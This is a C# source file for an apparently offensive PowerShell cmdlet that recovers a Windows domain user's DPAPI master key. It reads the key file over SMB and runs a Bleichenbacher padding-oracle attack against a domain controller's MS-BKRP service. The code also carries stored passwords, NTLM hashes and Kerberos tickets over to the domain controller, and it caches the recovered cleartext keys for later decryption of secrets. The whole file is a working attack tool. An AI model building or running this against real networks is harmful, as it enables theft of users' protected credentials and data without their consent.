using System;
using System.Management.Automation;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace Titanis.Tbo.Smb2.PowerShell
{
	public sealed class TboDpapiMasterKeyBkrpResult
	{
		public string DomainController { get; init; } = string.Empty;
		public string? MasterKeyFile { get; init; }
		public string? MasterKeyGuid { get; init; }
		public string? MasterKey { get; init; }
		public string? MasterKeyHash { get; init; }
		public long OracleQueries { get; init; }
		public string? FailureReason { get; init; }
	}

	/// <summary>
	/// Recovers a DPAPI master key from a domain-joined machine's master key file
	/// by exploiting the PKCS#1 v1.5 padding oracle in the MS-BKRP service on a DC.
	///
	/// Prerequisites:
	///   - You must hold the target user's master key FILE (e.g. via Backup Operator
	///     privileges or a readable roaming-profile share).
	///   - The master key file must contain a DomainKey block (domain-joined machine).
	///   - Any valid domain credential is sufficient to query the DC oracle;
	///     the victim user's credentials are NOT required.
	///   - This technique contacts the domain controller directly, not the target host.
	///
	/// The attack sends tens of thousands of RPC queries to the DC's
	/// \PIPE\protected_storage endpoint. Use QueryThrottleMs to reduce DC load
	/// at the cost of longer running time. Expect 15–60 minutes for a 2048-bit key.
	/// </summary>
	[Cmdlet(VerbsLifecycle.Invoke, "TBODpapiMasterKeyBkrp")]
	[OutputType(typeof(TboDpapiMasterKeyBkrpResult))]
	public sealed class InvokeTBODpapiMasterKeyBkrp : SmbCmdlet
	{
		[Parameter(Mandatory = true, Position = 0, ValueFromPipelineByPropertyName = true)]
		public string DomainController { get; set; } = string.Empty;

		// Master key file bytes — accepts pipeline from Get-TBODpapiMasterKeyLocations
		// or any byte[] source.
		[Parameter(Mandatory = true, ParameterSetName = "Bytes", ValueFromPipelineByPropertyName = true)]
		public byte[]? MasterKeyBytes { get; set; }

		// Alternatively read the master key file from the target over SMB.
		// Accepts pipeline from Get-TBODpapiMasterKeyLocations (ServerName + KeyPath properties).
		[Parameter(Mandatory = true, ParameterSetName = "Path", ValueFromPipelineByPropertyName = true)]
		public string? ServerName { get; set; }

		[Parameter(Mandatory = true, ParameterSetName = "Path", ValueFromPipelineByPropertyName = true)]
		[Alias("KeyPath")]
		public string? MasterKeyPath { get; set; }

		[Parameter]
		public string? ShareName { get; set; } = DpapiMasterKeyLocator.DefaultShareName;

		// GUID of the master key (informational, used for cache population).
		[Parameter(ValueFromPipelineByPropertyName = true)]
		public string? MasterKeyGuid { get; set; }

		// Optional: bytes of a BK-{domain} file from the user's Protect directory.
		// When provided, the DC's RSA public key is extracted from this file rather than
		// calling RETRIEVE_BACKUP_KEY on the DC (useful if the DC returns 0x57 for that call).
		[Parameter(ValueFromPipelineByPropertyName = true)]
		public byte[]? BackupKeyFileBytes { get; set; }

		// ── Oracle query pacing ──────────────────────────────────────────────────────
		// Artificial inter-query delay in milliseconds (0 = no throttle).
		// Increasing this reduces DC load at the cost of proportionally longer runtime.
		[Parameter]
		[ValidateRange(0, 60_000)]
		public int QueryThrottleMs { get; set; } = 0;

		// Retries on transient transport errors (not on oracle false/true responses).
		[Parameter]
		[ValidateRange(0, 10)]
		public int MaxRetries { get; set; } = 3;

		// Base delay before the first retry; doubles with each subsequent attempt.
		[Parameter]
		[ValidateRange(0, 30_000)]
		public int RetryBaseDelayMs { get; set; } = 500;

		// Hard upper bound on total oracle queries (safety valve against infinite loops).
		[Parameter]
		[ValidateRange(1_000, 1_000_000)]
		public int MaxOracleQueries { get; set; } = 300_000;

		// ── TBO cache ingest ─────────────────────────────────────────────────────────
		// When set (or when $env:TITANIS_TBO_CACHE_INGEST is truthy), the recovered cleartext
		// master key and its SHA-1 verifier are persisted to the TBO SQLite cache. The SHA-1
		// is what DPAPI itself uses to identify which master key decrypts a given blob, so
		// it's the natural index for follow-up "do we have the key for this blob?" queries.
		[Parameter]
		public SwitchParameter Cache { get; set; }

		[Parameter]
		public string? CachePath { get; set; }

		private CancellationTokenSource? _cancelSource;

		protected override void ProcessRecord(ISmbProviderInfo smb)
		{
			this._cancelSource ??= new CancellationTokenSource();
			var cancellationToken = this._cancelSource.Token;

			var dcName = DpapiHelpers.NormalizeServerName(this.DomainController);
			if (string.IsNullOrWhiteSpace(dcName))
				throw new ArgumentException("DomainController must be provided.", nameof(this.DomainController));

			// 1. Obtain the raw master key file bytes.
			byte[] rawMkFile;
			string? mkFilePath = null;

			if (this.MasterKeyBytes != null && this.MasterKeyBytes.Length > 0)
			{
				rawMkFile = this.MasterKeyBytes;
			}
			else if (!string.IsNullOrWhiteSpace(this.ServerName) && !string.IsNullOrWhiteSpace(this.MasterKeyPath))
			{
				mkFilePath = this.MasterKeyPath;
				try
				{
					rawMkFile = DpapiHelpers.ReadFileBytes(smb, UncPath.Parse(mkFilePath), cancellationToken);
				}
				catch (Exception ex)
				{
					this.WriteObject(new TboDpapiMasterKeyBkrpResult
					{
						DomainController = this.DomainController,
						MasterKeyFile = mkFilePath,
						MasterKeyGuid = this.MasterKeyGuid,
						FailureReason = $"Failed to read master key file from {mkFilePath}: {ex.Message}"
					});
					return;
				}
			}
			else
			{
				throw new ArgumentException(
					"Provide either MasterKeyBytes or both ServerName and MasterKeyPath.");
			}

			// 2. Parse the master key file and validate the DomainKey block.
			DpapiMasterKeyFile mkFile;
			try
			{
				mkFile = DpapiMasterKeyCrypto.ParseMasterKeyFile(rawMkFile);
			}
			catch (Exception ex)
			{
				this.WriteObject(new TboDpapiMasterKeyBkrpResult
				{
					DomainController = this.DomainController,
					MasterKeyFile = mkFilePath,
					MasterKeyGuid = this.MasterKeyGuid,
					FailureReason = $"Failed to parse master key file: {ex.Message}"
				});
				return;
			}

			if (mkFile.DomainKey == null)
			{
				this.WriteObject(new TboDpapiMasterKeyBkrpResult
				{
					DomainController = this.DomainController,
					MasterKeyFile = mkFilePath,
					MasterKeyGuid = this.MasterKeyGuid ?? mkFile.Guid?.ToString(),
					FailureReason = "Master key file does not contain a DomainKey block. " +
						"The BKRP attack only works on domain user accounts whose master keys have been " +
						"backed up to a DC. Local user accounts and machine-scope keys do not have a DomainKey block."
				});
				return;
			}

			var masterKeyGuid = this.MasterKeyGuid
				?? mkFile.Guid?.ToString()
				?? mkFile.GuidText?.Trim().Trim('{', '}');

			var domainKey = mkFile.DomainKey;

			this.WriteVerbose(
				$"Invoke-TBODpapiMasterKeyBkrp: DomainKey v{domainKey.Version}, " +
				$"backup key GUID {domainKey.BackupKeyGuid}, " +
				$"RSA ciphertext {domainKey.SecretData.Length} bytes.");

			// 3. If no DC-specific credentials are configured, inherit from the source server.
			//    Domain credentials are valid for any DC in the domain, but TBO stores credentials
			//    per-server, so they won't automatically apply to the DC.
			if (smb.GetConnectParametersFor(dcName, defaultIfNone: false) == null
				&& !string.IsNullOrWhiteSpace(this.ServerName))
			{
				var sourceName = DpapiHelpers.NormalizeServerName(this.ServerName!);
				if (smb.GetConnectParametersFor(sourceName, defaultIfNone: true) is SmbConnectionParameters sourceParams
					&& (sourceParams.Password != null || sourceParams.NtlmHash != null
						|| sourceParams.AesKey != null || sourceParams.DesKey != null
						|| sourceParams.Tgt != null || !string.IsNullOrEmpty(sourceParams.TicketCache)))
				{
					// Build an auth-only override (all connection-option fields null) and merge it
					// onto the DC's defaults.  HostName is intentionally omitted so Kerberos
					// requests a service ticket for the DC, not for the source server.
					var authOverride = new SmbConnectionParameters
					{
						UserName = sourceParams.UserName,
						UserDomain = sourceParams.UserDomain,
						Password = sourceParams.Password,
						NtlmHash = sourceParams.NtlmHash,
						AesKey = sourceParams.AesKey,
						DesKey = sourceParams.DesKey,
						Tgt = sourceParams.Tgt,
						Tickets = sourceParams.Tickets,
						TicketCache = sourceParams.TicketCache,
						Kdc = sourceParams.Kdc,
						KdcPort = sourceParams.KdcPort,
						Workstation = sourceParams.Workstation,
					};
					smb.SetConnectParameters(dcName,
						SmbConnectionParameters.MergeForServer(smb, dcName, authOverride));
				}
			}

			// 4. Open the BKRP session to the DC.
			BkrpSession bkrpSession;
			try
			{
				bkrpSession = smb.OpenBkrpSessionAsync(dcName, cancellationToken).GetAwaiter().GetResult();
			}
			catch (Exception ex)
			{
				this.WriteObject(new TboDpapiMasterKeyBkrpResult
				{
					DomainController = this.DomainController,
					MasterKeyFile = mkFilePath,
					MasterKeyGuid = masterKeyGuid,
					FailureReason = $"Failed to open BKRP session on {dcName}: {ex.Message}"
				});
				return;
			}

			// Warn after session opens — the attack is genuinely about to start.
			this.WriteWarning(
				$"Invoke-TBODpapiMasterKeyBkrp: Starting Bleichenbacher attack against {dcName}. " +
				$"This will send up to {this.MaxOracleQueries:N0} RPC queries to \\PIPE\\protected_storage. " +
				$"Expected runtime: 15–60+ minutes for a 2048-bit key. " +
				(this.QueryThrottleMs > 0
					? $"Query throttle: {this.QueryThrottleMs} ms."
					: "No inter-query throttle (use -QueryThrottleMs to reduce DC load)."));

			// 5. Run the Bleichenbacher oracle attack.
			long finalQueryCount = 0;
			byte[]? masterKey = null;
			string? failureReason = null;

			// Parse preloaded public key from BK file if supplied — skips RETRIEVE_BACKUP_KEY.
			//
			// Three sources, in priority order:
			//  1. -BackupKeyFileBytes (caller passed raw bytes)
			//  2. Auto-load from SMB: read the BK-{domain} file from the same Protect SID directory
			//     as the master key file. Each domain-joined user has a copy of their domain's RSA
			//     backup-key cert cached there alongside the master keys, and TBO already has the
			//     SMB session needed to read it. This eliminates the need to copy a BK file locally
			//     before invoking this cmdlet.
			//  3. Fall through to RETRIEVE_BACKUP_KEY against the DC (only works on DCs that don't
			//     return 0x57 for that opcode).
			BkrpPublicKeyInfo? preloadedKey = null;
			byte[]? backupKeyBytes = this.BackupKeyFileBytes;
			string? backupKeySource = backupKeyBytes != null && backupKeyBytes.Length > 0
				? "BackupKeyFileBytes parameter"
				: null;

			if ((backupKeyBytes == null || backupKeyBytes.Length == 0)
				&& !string.IsNullOrWhiteSpace(mkFilePath))
			{
				try
				{
					backupKeyBytes = DpapiHelpers.TryReadDomainBackupKeyFileBytes(
						smb, UncPath.Parse(mkFilePath), cancellationToken);
					if (backupKeyBytes != null && backupKeyBytes.Length > 0)
					{
						backupKeySource = $"SMB sibling of {mkFilePath}";
						this.WriteVerbose(
							$"Invoke-TBODpapiMasterKeyBkrp: auto-loaded {backupKeyBytes.Length}-byte " +
							$"BK-* file from {Path.GetDirectoryName(mkFilePath)}.");
					}
				}
				catch (Exception ex)
				{
					this.LogException(smb,
						$"Invoke-TBODpapiMasterKeyBkrp could not auto-load BK-* file next to {mkFilePath}",
						ex, emitWarning: false);
				}
			}

			if (backupKeyBytes != null && backupKeyBytes.Length > 0)
			{
				try
				{
					preloadedKey = BkrpPublicKeyInfo.FromBkFile(backupKeyBytes);
					this.WriteVerbose(
						$"Invoke-TBODpapiMasterKeyBkrp: Loaded RSA public key from {backupKeySource} " +
						$"({preloadedKey.KeySizeBytes * 8}-bit). Skipping RETRIEVE_BACKUP_KEY.");
				}
				catch (Exception ex)
				{
					this.WriteObject(new TboDpapiMasterKeyBkrpResult
					{
						DomainController = this.DomainController,
						MasterKeyFile = mkFilePath,
						MasterKeyGuid = masterKeyGuid,
						FailureReason = $"Failed to parse BK file from {backupKeySource}: {ex.Message}"
					});
					return;
				}
			}

			using (bkrpSession)
			{
				var oracleOptions = new BkrpOracleOptions
				{
					QueryThrottleMs = this.QueryThrottleMs,
					MaxRetries = this.MaxRetries,
					RetryBaseDelayMs = this.RetryBaseDelayMs,
					MaxOracleQueries = this.MaxOracleQueries
				};

				// Progress<T> callbacks run on the thread pool (PowerShell's pipeline thread
				// has no SynchronizationContext in PS 7), so WriteVerbose cannot be called
				// here — it throws PSInvalidOperationException and crashes the process.
				// Route progress to the TBO diagnostic log (thread-safe) instead.
				var smbProvider = smb as SmbProviderInfo;
				var progressHandler = new Progress<BleichenbacherProgress>(p =>
				{
					finalQueryCount = p.OracleQueries;
					smbProvider?.LogVerbose(
						$"[BKRP oracle] Step {p.Step}: {p.OracleQueries} queries, " +
						$"{p.IntervalsRemaining} interval(s)" +
						(p.BitRangeRemaining > 0 ? $", {p.BitRangeRemaining} bits remaining" : "") +
						$" — {p.Message}");
				});

				try
				{
					masterKey = DomainKeyDecryption.DecryptMasterKeyAsync(
						bkrpSession, domainKey, oracleOptions, progressHandler, cancellationToken,
						preloadedKey)
						.GetAwaiter().GetResult();
				}
				catch (OperationCanceledException)
				{
					failureReason = "Cancelled.";
				}
				catch (Exception ex)
				{
					failureReason = ex.Message;
					this.LogException(smb, "Invoke-TBODpapiMasterKeyBkrp oracle attack failed", ex, emitWarning: false);
				}
			}

			// 6. Emit result + persist to caches.
			if (masterKey != null && masterKey.Length > 0)
			{
				var masterKeyHash = SHA1.HashData(masterKey);
				var masterKeyHex = masterKey.ToHexString();
				var masterKeyHashHex = masterKeyHash.ToHexString();

				// Populate the in-memory session cache so downstream DPAPI blob decryption works
				// without re-running the attack. Indexed by the *source* server where the master
				// key file lives — that's where any DPAPI blobs that need this key will be found.
				var cacheKeyServer = !string.IsNullOrWhiteSpace(this.ServerName)
					? DpapiHelpers.NormalizeServerName(this.ServerName!)
					: dcName;

				if (!string.IsNullOrWhiteSpace(masterKeyGuid)
					&& Guid.TryParse(masterKeyGuid, out var parsedMasterKeyGuid))
				{
					TboDpapiMasterKeyCache.TrySet(smb, cacheKeyServer, parsedMasterKeyGuid, masterKey);
				}

				// Persist to the SQLite cache when -Cache or $env:TITANIS_TBO_CACHE_INGEST is set.
				// Use the source server (where the master key file lives), not the DC oracle.
				var ingestCache = this.ResolveCacheIngestionEnabled(this.Cache);
				if (ingestCache && !string.IsNullOrWhiteSpace(masterKeyGuid))
				{
					TboCacheDatabase? cacheDb = null;
					try
					{
						cacheDb = TboCacheDatabase.Open(this.CachePath, msg => this.WriteVerbose(msg));
						var machineId = cacheDb.UpsertMachine(cacheKeyServer);
						cacheDb.UpsertDpapiMasterKey(
							machineId: machineId,
							scope: "User",
							userSid: null,
							keyPath: mkFilePath ?? string.Empty,
							masterKeyGuid: masterKeyGuid,
							isPreferred: false,
							isDomain: true,
							hashContext: null,
							hash: null,
							hashLine: null,
							failureReason: null,
							cleartextKey: masterKey,
							cleartextKeySha1: masterKeyHashHex);
					}
					catch (Exception ex)
					{
						this.LogException(smb,
							$"Invoke-TBODpapiMasterKeyBkrp failed to write recovered master key to TBO cache for {cacheKeyServer}",
							ex, emitWarning: false);
						this.LogWarning(smb,
							$"Invoke-TBODpapiMasterKeyBkrp cache write failed: {ex.Message}");
					}
					finally
					{
						cacheDb?.Dispose();
					}
				}

				this.WriteObject(new TboDpapiMasterKeyBkrpResult
				{
					DomainController = this.DomainController,
					MasterKeyFile = mkFilePath,
					MasterKeyGuid = masterKeyGuid,
					MasterKey = masterKeyHex,
					MasterKeyHash = masterKeyHashHex,
					OracleQueries = finalQueryCount
				});
			}
			else
			{
				this.WriteObject(new TboDpapiMasterKeyBkrpResult
				{
					DomainController = this.DomainController,
					MasterKeyFile = mkFilePath,
					MasterKeyGuid = masterKeyGuid,
					OracleQueries = finalQueryCount,
					FailureReason = failureReason ?? "Unknown failure."
				});
			}
		}

		protected override void StopProcessing()
		{
			this._cancelSource?.Cancel();
			base.StopProcessing();
		}
	}
}
